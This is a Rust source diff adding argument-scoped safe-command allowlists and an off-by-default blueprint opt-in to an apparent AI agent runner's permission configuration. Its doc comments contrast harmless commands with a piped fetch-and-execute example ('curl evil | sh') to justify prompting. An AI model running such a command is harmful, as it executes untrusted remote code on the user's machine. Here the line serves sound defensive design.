@@ -154,6 +154,38 @@ pub struct Config {
     #[serde(default)]
     pub agent_tool_permissions: HashMap<String, HashMap<String, ToolPolicy>>,
 
+    /// What a run may do without asking, for tools whose policy is `ask`.
+    ///
+    /// `ask` is all-or-nothing per tool name, which for the shell means
+    /// choosing between a prompt on every `ls` and no prompt on
+    /// `curl evil | sh`. Entries here are argument-scoped, in the same key space
+    /// a "for this run" grant uses:
+    ///
+    /// ```toml
+    /// [safe_commands]
+    /// defaults = true                 # ship the read-only verb list
+    /// tools = ["read_files"]
+    /// shell = ["cargo test", "rg"]    # `cargo test` never covers `cargo publish`
+    /// ```
+    ///
+    /// A safe entry can only ever turn `ask` into `allow`. It never reaches a
+    /// configured `deny`.
+    #[serde(default)]
+    pub safe_commands: crate::approvals::SafeCommands,
+
+    /// Per-agent additions to [`Self::safe_commands`], keyed by agent name.
+    ///
+    /// ```toml
+    /// [agent_safe_commands.software-engineer]
+    /// shell = ["./gradlew", "ninja"]
+    /// allow_blueprint = true
+    /// ```
+    ///
+    /// Mirrors [`Self::agent_tool_permissions`] and [`Self::agent_read_paths`]:
+    /// naming the agent is the user saying "I trust this one".
+    #[serde(default)]
+    pub agent_safe_commands: HashMap<String, crate::approvals::AgentSafeCommands>,
+
     /// Title-generation configuration.
     ///
     /// Controls whether a short human-readable title is auto-generated from
@@ -360,6 +392,19 @@ pub struct SecurityConfig {
     #[serde(default)]
     pub allow_blueprint_read_paths: bool,
 
+    /// Honour every blueprint's own `[safe_commands]` block.
+    ///
+    /// **Off by default**, and for the same reason as
+    /// [`Self::allow_blueprint_read_paths`]: a `[safe_commands]` block travels
+    /// inside an `agent.leviath` you installed, so letting it count by itself
+    /// would let any agent package pre-approve its own shell with one TOML line.
+    /// With this off, a blueprint's list is inert until you opt in, either here
+    /// for every agent or per agent via
+    /// `[agent_safe_commands.<name>] allow_blueprint = true`. Prefer the
+    /// per-agent grant for anything you did not author yourself.
+    #[serde(default)]
+    pub allow_blueprint_safe_commands: bool,
+
     /// Machine-wide read grants for agents that declare `[read_paths]`.
     ///
     /// Entries use the same three forms as a blueprint's `[read_paths] allow`:
@@ -413,6 +458,7 @@ impl Default for SecurityConfig {
             allow_local_network: false,
             allow_env_vars: Vec::new(),
             allow_blueprint_read_paths: false,
+            allow_blueprint_safe_commands: false,
             read_paths: Vec::new(),
             credential_store: leviath_core::CredentialStoreKind::File,
         }
@@ -845,6 +891,8 @@ impl Default for Config {
             model_providers: HashMap::new(),
             tool_permissions: HashMap::new(),
             agent_tool_permissions: HashMap::new(),
+            safe_commands: crate::approvals::SafeCommands::default(),
+            agent_safe_commands: HashMap::new(),
             title: TitleConfig::default(),
             request_timeout_secs: None,
             rate_limits: HashMap::new(),
@@ -877,6 +925,25 @@ impl Config {
             merged.extend(per_agent.iter().map(|(k, v)| (k.clone(), *v)));
         }
         merged
+    }
+
+    /// The safe-command keys in effect for `agent_name`, and where each came
+    /// from. Resolved once at spawn, mirroring [`Self::permissions_for_agent`].
+    ///
+    /// `blueprint` is the manifest's own `[safe_commands]`, which contributes
+    /// only when the user opted in - see
+    /// [`crate::approvals::resolve_safe_keys`].
+    pub fn safe_keys_for_agent(
+        &self,
+        agent_name: &str,
+        blueprint: Option<&leviath_core::blueprint::SafeCommandsConfig>,
+    ) -> std::collections::BTreeMap<String, crate::approvals::SafeSource> {
+        crate::approvals::resolve_safe_keys(
+            &self.safe_commands,
+            self.agent_safe_commands.get(agent_name),
+            blueprint,
+            self.security.allow_blueprint_safe_commands,
+        )
     }
 
     /// Every read-path grant that applies to `agent_name`: the machine-wide
@@ -3140,6 +3207,8 @@ enabled = false
             model_providers: HashMap::new(),
             tool_permissions: tool_perms,
             agent_tool_permissions: HashMap::new(),
+            safe_commands: crate::approvals::SafeCommands::default(),
+            agent_safe_commands: HashMap::new(),
             title: TitleConfig {
                 enabled: false,
                 provider: Some("openai".to_string()),
@@ -3200,6 +3269,7 @@ enabled = false
                 allow_local_network: true,
                 allow_env_vars: vec!["MY_PROVIDER_KEY".to_string()],
                 allow_blueprint_read_paths: true,
+                allow_blueprint_safe_commands: true,
                 read_paths: vec!["~/.leviath/runs".to_string()],
                 credential_store: leviath_core::CredentialStoreKind::Keychain,
             },
